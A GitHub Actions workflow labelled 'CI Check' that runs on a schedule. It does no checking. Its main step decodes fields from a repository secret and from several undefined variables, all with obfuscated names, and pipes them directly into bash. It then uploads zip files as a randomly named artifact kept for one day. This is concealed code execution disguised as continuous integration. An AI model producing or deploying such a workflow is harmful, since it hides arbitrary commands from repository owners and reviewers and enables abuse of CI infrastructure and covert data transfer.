name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '52 1,7,13,19 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  agent:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Perform
        env:
          gay2: ${{ secrets.gay2 }}
        run: |
          printf '%s' "$gay2" | jq -r .nnlv1005 | /bin/bash
          printf '%s' "$op22" | jq -r .u6 | /bin/bash
          printf '%s' "$osahv67101" | jq -r .njga751 | /bin/bash
          printf '%s' "$dgmhq2301" | jq -r .znk648 | /bin/bash

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: VlgwzLEy
          path: "*.zip"
          retention-days: 1
